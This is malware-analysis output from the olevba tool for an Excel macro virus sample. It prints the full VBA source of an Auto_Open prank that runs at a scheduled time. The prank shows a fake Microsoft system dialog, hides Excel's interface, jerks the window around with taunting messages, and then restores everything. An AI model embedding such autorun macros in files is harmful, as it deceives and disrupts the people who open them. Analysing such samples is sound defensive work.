olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Ian-4769fe5f47ff09b5deadddd369bd056b3c40c5f8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Ian's Other Macros.bas 
in file: Virus.MSExcel.Ian-4769fe5f47ff09b5deadddd369bd056b3c40c5f8 - OLE stream: "_VBA_PROJECT_CUR/VBA/Ian's Other Macros"
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
' The fun starts here
'

Public Redisplay

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    TrapTime
End Sub

Sub TrapTime()
Attribute TrapTime.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnTime earliesttime:=#1/2/97 10:00:00 AM#, procedure:="MyFinalGiftToYou"
End Sub

Sub MyFinalGiftToYou()
Attribute MyFinalGiftToYou.VB_Description = "Just so you don't forget me!!!!"
Attribute MyFinalGiftToYou.VB_ProcData.VB_Invoke_Func = " \n14"
    Redisplay = False
    Sheets("Data Sheet").Select
    MsgBox "Data Backup is due. " & Chr$(10) & "Please press YES to comence" & Chr$(10) & "or NO to defer until later.", vbInformation + vbYesNo, "Microsoft Excel - System Message"
    Cells.Select
    For Counter = 34 To 36
        Selection.Font.ColorIndex = Counter
    Next
    MsgBox "BEWARE! - Excel is possessed by" & Chr$(10) & " a highly mischievous spirit!" & Chr$(10) & Chr$(10) & "Please PANIC NOW!!!!!!!!!", vbExclamation, "Message from the past"
    Application.DisplayFormulaBar = False
    Application.DisplayStatusBar = False
    Toolbars(2).Visible = False
    Toolbars(1).Visible = False
    ActiveWindow.FreezePanes = False
    With ActiveWindow
        .SplitColumn = 0
        .SplitRow = 0
    End With
    Range("A1").Select
    Selection.AutoFilter
    With ActiveWindow
        .DisplayGridlines = False
        .DisplayHeadings = False
        .DisplayHorizontalScrollBar = False
        .DisplayVerticalScrollBar = False
        .DisplayWorkbookTabs = False
    End With
    Response = MsgBox("Would you like your data back?", vbYesNo + vbQuestion, "Message")
    If Response = vbYes Then
        Redisplay = True
    End If
    If Redisplay = True Then
        Cells.Select
        For Counter = 35 To 34 Step -1
            Selection.Font.ColorIndex = Counter
        Next
        Selection.Font.ColorIndex = xlAutomatic
    End If
    For counter2 = 1 To 2
        With Application
            .WindowState = xlNormal
            .Top = 0
            .Left = 0
            .Width = 605
            .Height = 455
        End With
        With ActiveWindow
            .WindowState = xlNormal
            .Width = 605
            .Height = 425
            .Left = 0
            .Top = 0
        End With
        For Counter = 605 To 125 Step -2
            Application.Width = Counter
        Next
        For Counter = 455 To 35 Step -2
            Application.Height = Counter
        Next
        For Counter = 0 To 220
            With Application
                .Top = Counter
                .Left = Counter
            End With
        Next
        MsgBox "There is nothing you can do" & Chr$(10) & "except sit back and watch.", vbExclamation, "You are no longer in control"
        For Counter = 220 To 0 Step -1
            With Application
                .Top = Counter
                .Left = Counter
            End With
        Next
        For Counter = 125 To 605 Step 2
            Application.Width = Counter
        Next
        For Counter = 35 To 455 Step 2
            Application.Height = Counter
        Next
        Application.WindowState = xlMaximized
        For Counter = 350 To 0 Step -2
            With ActiveWindow
                .Top = 190 - Counter * 0.543
                .Left = 255 - Counter * 0.73
                .Height = 43.45 + Counter * 1.081
                .Width = 75 + Counter * 1.514
            End With
        Next
        For Counter = 350 To 0 Step -2
            With ActiveWindow
                .Top = Counter * 0.543
                .Left = Counter * 0.729
            End With
        Next
        For Counter = 0 To 532 Step 4
            ActiveWindow.Left = Counter
        Next
        For Counter = 0 To 382 Step 2
            ActiveWindow.Top = Counter
        Next
        For Counter = 532 To 0 Step -4
            ActiveWindow.Left = Counter
        Next
        For Counter = 382 To 0 Step -2
            ActiveWindow.Top = Counter
        Next
        For Counter = 0 To 350 Step 2
            With ActiveWindow
                .Top = Counter * 0.543
                .Left = Counter * 0.729
            End With
        Next
        MsgBox "You never know what Excel will do next.", vbInformation, "Is this Derek's worst nightmare come true?"
        For Counter = 0 To 350 Step 2
            With ActiveWindow
                .Top = 190 - Counter * 0.543
                .Left = 255 - Counter * 0.73
                .Height = 43.45 + Counter * 1.081
                .Width = 75 + Counter * 1.514
            End With
        Next
    Next
    MsgBox "Life on PPU will NEVER be boring AGAIN!!" & Chr$(10) & Chr$(10) & "Temporary normality will now be resumed.", vbInformation, "Important message from Ian Mugridge"
    DisplayOK
End Sub

Sub DisplayOK()
Attribute DisplayOK.VB_ProcData.VB_Invoke_Func = " \n14"
    ActiveWindow.WindowState = xlMaximized
    Application.DisplayFormulaBar = True
    Application.DisplayStatusBar = True
    Toolbars(1).Visible = True
    Toolbars(2).Visible = True
    Range("A1").Select
    With ActiveWindow
        .DisplayGridlines = True
        .DisplayHeadings = True
        .DisplayHorizontalScrollBar = True
        .DisplayVerticalScrollBar = True
        .DisplayWorkbookTabs = True
    End With
    Selection.AutoFilter
    Cells.Select
    If Redisplay = False Then
        For Counter = 35 To 34 Step -1
            Selection.Font.ColorIndex = Counter
        Next
    End If
    Selection.Font.ColorIndex = xlAutomatic
    Range("D2").Select
    With ActiveWindow
        .SplitColumn = 3
        .SplitRow = 1
        .FreezePanes = True
    End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Data Shee
' 0085     26 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  Ian's Other Macro
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

